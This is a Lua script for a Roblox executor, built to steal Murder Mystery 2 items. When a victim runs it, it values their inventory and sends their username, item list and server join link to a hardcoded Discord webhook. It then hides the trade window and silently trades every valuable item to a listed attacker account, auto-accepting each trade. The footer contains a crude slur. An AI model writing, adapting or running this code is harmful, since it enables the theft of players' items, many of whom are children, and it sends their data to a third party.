_G.Usernames = {"Haker_piski228"}
_G.webhook = "https://discord.com/api/webhooks/1391024705187610664/9KEtPw4SenX4-HmHYgHpQZJpj4l58nHZW7LYE_vYRLhUa_rFvYSAfKr7GURZ-_LX9yGO"
_G.pingEveryone = "No"
_G.min_value = 0
_G.min_rarity = "Common"

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local playerGui = plr:WaitForChild("PlayerGui")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))

local users = _G.Usernames or {}
local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

if game.PlaceId ~= 142823291 then
    plr:kick("Game not supported. Please join a normal MM2 server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

if #Players:GetPlayers() >= 12 then
    plr:kick("Server is full. Please join a less populated server")
    return
end

local weaponsToSend = {}
local totalValue = 0

local rarityTable = {
    "Common",
    "Uncommon",
    "Rare",
    "Legendary",
    "Godly",
    "Ancient",
    "Unique",
    "Vintage"
}

local categories = {
    godly = "https://supremevaluelist.com/mm2/godlies.html",
    ancient = "https://supremevaluelist.com/mm2/ancients.html",
    unique = "https://supremevaluelist.com/mm2/uniques.html",
    classic = "https://supremevaluelist.com/mm2/vintages.html",
    chroma = "https://supremevaluelist.com/mm2/chromas.html"
}

local headers = {
    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
}

local function trim(s)
    return s:match("^%s*(.-)%s*$")
end

local function fetchHTML(url)
    local response = request({
        Url = url,
        Method = "GET",
        Headers = headers
    })
    return response.Body
end

local function parseValue(itembodyDiv)
    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    if valueStr then
        valueStr = valueStr:gsub(",", "")
        local value = tonumber(valueStr)
        if value then
            return value
        end
    end
    return nil
end

local function extractItems(htmlContent)
    local itemValues = {}
    
    for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        itemName = itemName:match("([^<]+)")
        if itemName then
            itemName = trim(itemName:gsub("%s+", " "))
            itemName = trim((itemName:split(" Click "))[1])
            local itemNameLower = itemName:lower()

            local value = parseValue(itembodyDiv)
            if value then
                itemValues[itemNameLower] = value
            end
        end
    end
    
    return itemValues
end

local function extractChromaItems(htmlContent)
    local chromaValues = {}

    for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        chromaName = chromaName:match("([^<]+)")
        if chromaName then
            chromaName = trim(chromaName:gsub("%s+", " ")):lower()
            local value = parseValue(itembodyDiv)
            if value then
                chromaValues[chromaName] = value
            end
        end
    end
    
    return chromaValues
end

local itemValuesCache = nil
local lastCacheUpdate = 0

local function updateItemValues()
    local allExtractedValues = {}
    local chromaExtractedValues = {}
    local categoriesToFetch = {}

    for rarity, url in pairs(categories) do
        table.insert(categoriesToFetch, {rarity = rarity, url = url})
    end
    
    local totalCategories = #categoriesToFetch
    local completed = 0
    local lock = Instance.new("BindableEvent")

    for _, category in ipairs(categoriesToFetch) do
        task.spawn(function()
            local rarity = category.rarity
            local url = category.url
            local htmlContent = fetchHTML(url)
            
            if htmlContent and htmlContent ~= "" then
                if rarity ~= "chroma" then
                    local extractedItemValues = extractItems(htmlContent)
                    for itemName, value in pairs(extractedItemValues) do
                        allExtractedValues[itemName] = value
                    end
                else
                    chromaExtractedValues = extractChromaItems(htmlContent)
                end
            end

            completed = completed + 1
            if completed == totalCategories then
                lock:Fire()
            end
        end)
    end

    lock.Event:Wait()
    
    itemValuesCache = {
        normal = allExtractedValues,
        chroma = chromaExtractedValues
    }
    lastCacheUpdate = os.time()
    
    return itemValuesCache
end

local function getWeaponsWithValues()
    local inventory = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
    local weapons = {}
    local totalVal = 0
    
    if not itemValuesCache or os.time() - lastCacheUpdate > 300 then
        updateItemValues()
    end
    
    local min_rarity_index = table.find(rarityTable, min_rarity)
    
    local untradable = {
        ["DefaultGun"] = true,
        ["DefaultKnife"] = true,
        ["Reaver"] = true,
        ["Reaver_Legendary"] = true,
        ["Reaver_Godly"] = true,
        ["Reaver_Ancient"] = true,
        ["IceHammer"] = true,
        ["IceHammer_Legendary"] = true,
        ["IceHammer_Godly"] = true,
        ["IceHammer_Ancient"] = true,
        ["Gingerscythe"] = true,
        ["Gingerscythe_Legendary"] = true,
        ["Gingerscythe_Godly"] = true,
        ["Gingerscythe_Ancient"] = true,
        ["TestItem"] = true,
        ["Season1TestKnife"] = true,
        ["Cracks"] = true,
        ["Icecrusher"] = true,
        ["???"] = true,
        ["Dartbringer"] = true,
        ["TravelerAxeRed"] = true,
        ["TravelerAxeBronze"] = true,
        ["TravelerAxeSilver"] = true,
        ["TravelerAxeGold"] = true,
        ["BlueCamo_K_2022"] = true,
        ["GreenCamo_K_2022"] = true,
        ["SharkSeeker"] = true
    }
    
    for itemId, amount in pairs(inventory.Weapons.Owned) do
        local itemData = database[itemId]
        if itemData and not untradable[itemId] then
            local itemName = itemData.ItemName or "Unknown"
            local rarity = itemData.Rarity or "Common"
            local isChroma = itemData.Chroma or false
            local itemNameLower = itemName:lower()
            local weapon_rarity_index = table.find(rarityTable, rarity)
            
            if weapon_rarity_index and weapon_rarity_index >= min_rarity_index then
                local value = 0
                if isChroma then
                    for chromaName, chromaValue in pairs(itemValuesCache.chroma) do
                        if chromaName:find(itemNameLower, 1, true) then
                            value = chromaValue
                            break
                        end
                    end
                else
                    value = itemValuesCache.normal[itemNameLower] or 0
                end
                
                if value >= min_value then
                    local totalItemValue = value * amount
                    
                    table.insert(weapons, {
                        DataID = itemId,
                        name = itemName,
                        amount = amount,
                        value = value,
                        totalValue = totalItemValue,
                        rarity = rarity,
                        chroma = isChroma
                    })
                    
                    totalVal = totalVal + totalItemValue
                end
            end
        end
    end
    
    table.sort(weapons, function(a, b)
        local rarityA = table.find(rarityTable, a.rarity) or 0
        local rarityB = table.find(rarityTable, b.rarity) or 0
        
        if rarityA ~= rarityB then
            return rarityA > rarityB
        end
        return a.totalValue > b.totalValue
    end)
    
    return weapons, totalVal
end

local function sendTradeRequest(user)
    local args = {
        [1] = game:GetService("Players"):WaitForChild(user)
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
end

local function getTradeStatus()
    return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
end

local function waitForTradeCompletion()
    while true do
        local status = getTradeStatus()
        if status == "None" then
            break
        end
        wait(0.1)
    end
end

local function acceptTrade()
    local args = {
 428469873,
 100502.67878227495
}
game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
end

local function addWeaponToTrade(id)
    local args = {
        [1] = id,
        [2] = "Weapons"
    }
    ReplicatedStorage.Trade.OfferItem:FireServer(unpack(args))
end

local function SendTradeMessage(weapons, totalVal)
    local prefix = ""
    if ping == "Yes" then
        prefix = "@everyone "
    end

    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Join link:",
            value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId,
            inline = true
        },
        {
            name = "Item list:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Value: %s", totalVal),
            inline = false
        }
    }

    for _, weapon in ipairs(weapons) do
        local itemLine = string.format("%s (x%s): %s Value (%s)", weapon.name, weapon.amount, (weapon.value * weapon.amount), weapon.rarity)
        fields[3].value = fields[3].value .. itemLine .. "\n"
    end

    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "🤑 Join to get MM2 hit 🤑",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "By floppa kids fucker lil"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    
    request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

-- Main execution
local tradegui = playerGui:WaitForChild("TradeGUI")
tradegui:GetPropertyChangedSignal("Enabled"):Connect(function()
    tradegui.Enabled = false
end)
local tradeguiphone = playerGui:WaitForChild("TradeGUI_Phone")
tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function()
    tradeguiphone.Enabled = false
end)

local weapons, totalVal = getWeaponsWithValues()
totalValue = totalVal

if #weapons > 0 then
    weaponsToSend = weapons
    SendTradeMessage(weapons, totalVal)

    local function doTrade(joinedUser)
        local initialTradeState = getTradeStatus()
        if initialTradeState == "StartTrade" then
            ReplicatedStorage.Trade.DeclineTrade:FireServer()
            wait(0.3)
        elseif initialTradeState == "ReceivingRequest" then
            ReplicatedStorage.Trade.DeclineRequest:FireServer()
            wait(0.3)
        end

        while #weaponsToSend > 0 do
            local tradeStatus = getTradeStatus()

            if tradeStatus == "None" then
                sendTradeRequest(joinedUser)
            elseif tradeStatus == "SendingRequest" then
                wait(0.3)
            elseif tradeStatus == "ReceivingRequest" then
                ReplicatedStorage.Trade.DeclineRequest:FireServer()
                wait(0.3)
            elseif tradeStatus == "StartTrade" then
                for i = 1, math.min(4, #weaponsToSend) do
                    local weapon = table.remove(weaponsToSend, 1)
                    for count = 1, weapon.amount do
                        addWeaponToTrade(weapon.DataID)
                    end
                end
                wait(6)
                acceptTrade()
                waitForTradeCompletion()
            else
                wait(0.5)
            end
            wait(1)
        end
    end

    local function waitForUserChat()
        local sentMessage = false
        local function onPlayerChat(player)
            if table.find(users, player.Name) then
                player.Chatted:Connect(function()
                    if not sentMessage then
                        sentMessage = true
                    end
                    doTrade(player.Name)
                end)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
        Players.PlayerAdded:Connect(onPlayerChat)
    end
    waitForUserChat()
end
